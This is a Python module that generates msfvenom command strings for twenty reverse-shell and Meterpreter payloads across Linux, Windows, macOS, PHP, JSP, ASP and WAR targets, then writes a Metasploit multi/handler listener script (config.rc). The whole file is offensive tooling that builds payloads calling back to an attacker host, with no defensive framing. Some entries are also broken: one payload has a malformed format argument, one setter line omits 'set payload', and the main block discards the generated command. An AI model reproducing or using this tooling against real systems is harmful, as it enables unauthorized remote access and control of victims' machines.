#!/usr/bin/python3

#This File is Module
#Require msfvenom 
import os
import sys

def payload_gen(lhost,selected_port,cmd_number):

    payload1  = f"msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={lhost} LPORT={selected_port} -f elf > shell.elf"
    payload2  = f"msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={selected_port} -f elf > shell.elf"
    payload3  = f"msfvenom -p linux/x86/meterpreter_reverse_http LHOST={lhost} LPORT={selected_port} -f elf > shell.elf"
    payload4  = f"msfvenom -p linux/x64/meterpreter_reverse_http LHOST={lhost} LPORT={selected_port} -f elf > shell.elf"
    payload5  = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={selected_port} -f exe > shell.exe"
    payload6  = f"msfvenom -p windows/shell_reverse_tcp LHOST={lhost} LPORT={selected_port} -f exe > shell.exe"
    payload7  = f"msfvenom -p windows/meterpreter/reverse_http LHOST={lhost} LPORT={selected_port} -f exe > shell.exe"
    payload8  = f"msfvenom -p windows/meterpreter/reverse_https LHOST={lhost} LPORT={selected_port} -f exe > shell.exe"
    payload9  = f"msfvenom -p cmd/windows/reverse_powershell LHOST={lhost} LPORT={selected_port} > shell.bat"
    payload10 = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={selected_port} -f vba"
    payload11 = f"msfvenom -p osx/x86/shell_reverse_tcp LHOST={lhost} LPORT={selected_port} -f macho > shell.macho"
    payload12 = f"msfvenom -p osx/x86/shell_reverse_tcp LHOST={lhost} LPORT={selected_port} -f < platform"
    payload13 = f"msfvenom -p cmd/unix/reverse_python LHOST={lhost} LPORT={selected_port} -f raw > shell.py"
    payload14 = f"msfvenom -p cmd/unix/reverse_bash LHOST={lhost} LPORT={selected_port} -f raw > shell.sh"
    payload15 = f"msfvenom -p cmd/unix/reverse_perl LHOST={lhost} LPORT={selected_port} -f raw > shell.pl"
    payload16 = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={selected_port} -f asp > shell.asp"
    payload17 = f"msfvenom -p java/jsp_shell_reverse_tcp LHOST={lhost} LPORT={selected_port} -f raw > shell.jsp"
    payload18 = f"msfvenom -p java/jsp_shell_reverse_tcp LHOST={lhost} LPORT={selected_port} -f war > shell.war"
    payload19 = f"msfvenom -p php/reverse_php LHOST={lhost} LPORT={selected_port} -f raw > shell.php"
    payload20 = f"msfvenom -p php/meterpreter_reverse_tcp LHOST={lhost} LPORT={selected_port} -f raw > shell.php"

    fire_stored = [payload1,payload2,payload3,payload4,payload5,payload6,payload7,payload8,payload9,payload10,payload11,payload12,payload13,payload14,payload15,payload16,payload17,payload18,payload19,payload20]
    generated_payload = (fire_stored[int(cmd_number)])    
    
    del fire_stored

    return generated_payload    

def payload_setter(cmd_number):

    #cmd_number = int(cmd_number) -1

    payload1  = f"set payload linux/x86/meterpreter/reverse_tcp"
    payload2  = f"set payload linux/x64/meterpreter/reverse_tcp"
    payload3  = f"set payload linux/x86/meterpreter_reverse_http"
    payload4  = f"set payload linux/x64/meterpreter_reverse_http"
    payload5  = f"set payload windows/meterpreter/reverse_tcp"
    payload6  = f"set payload windows/shell_reverse_tcp"
    payload7  = f"set payload windows/meterpreter/reverse_http"
    payload8  = f"set payload windows/meterpreter/reverse_https"
    payload9  = f"set payload cmd/windows/reverse_powershell"
    payload10 = f"set payload windows/meterpreter/reverse_tcp"
    payload11 = f"set payload osx/x86/shell_reverse_tcp"
    payload12 = f"set payload osx/x86/shell_reverse_tcp"
    payload13 = f"set payload cmd/unix/reverse_python"
    payload14 = f"set payload cmd/unix/reverse_bash"
    payload15 = f"set payload cmd/unix/reverse_perl"
    payload16 = f"set payload windows/meterpreter/reverse_tcp"
    payload17 = f"set payload java/jsp_shell_reverse_tcp"
    payload18 = f"set payload java/jsp_shell_reverse_tcp"
    payload19 = f"set payload php/reverse_php"
    payload20 = f"php/meterpreter_reverse_tcp"

    fire_stored = [payload1,payload2,payload3,payload4,payload5,payload6,payload7,payload8,payload9,payload10,payload11,payload12,payload13,payload14,payload15,payload16,payload17,payload18,payload19,payload20]
    set_payload = (fire_stored[int(cmd_number)])
    
    del fire_stored

    return set_payload

def listener_config(lhost,selected_port,set_payload):

    file_name = "config.rc"

    os.system(f"touch {file_name}")
    f = open("config.rc","w")
    f.write("use exploit/multi/handler\n")
    f.write(f"{set_payload}\n")
    f.write(f"set lhost {lhost}\n")
    f.write(f"set lport {selected_port}\n")
    f.write(f"set ExitOnSessions false\n")
    f.write(f"set EXITFUNC thread\n")
    f.write(f"exploit -j\n")
    f.close()
   
    del f 

    return file_name

if __name__ == "__main__":

    lhost = sys.argv[1]
    selected_port = sys.argv[2]
    cmd_number = int(sys.argv[3]) -1

    payload_gen(lhost,selected_port,cmd_number)
    set_payload = payload_setter(cmd_number)
    listener_config(lhost,selected_port,set_payload)
